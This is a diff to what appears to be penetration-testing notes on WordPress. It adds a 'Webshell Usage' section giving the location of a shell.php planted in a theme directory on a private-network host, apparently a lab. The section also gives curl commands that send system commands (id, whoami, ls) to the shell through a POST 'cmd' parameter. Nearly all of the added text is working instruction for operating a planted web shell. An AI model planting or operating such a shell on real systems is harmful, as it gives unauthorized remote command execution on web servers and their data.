@@ -329,3 +329,19 @@ curl -s -X POST http://TARGET/xmlrpc.php
 - [NVD](https://nvd.nist.gov/)
 - [WordPress Security Releases](https://wordpress.org/news/category/security/)
 - [RIPSTECH Blog](https://blog.ripstech.com/)
+
+## Webshell Usage
+
+The shell is at:
+```
+http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php
+```
+
+It accepts commands via POST parameter `cmd`. Direct GET access shows a blank page (expected).
+
+Examples:
+```bash
+curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php" -d "cmd=id"
+curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php" -d "cmd=whoami"
+curl -X POST "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php" -d "cmd=ls -la /var/www/html"
+```
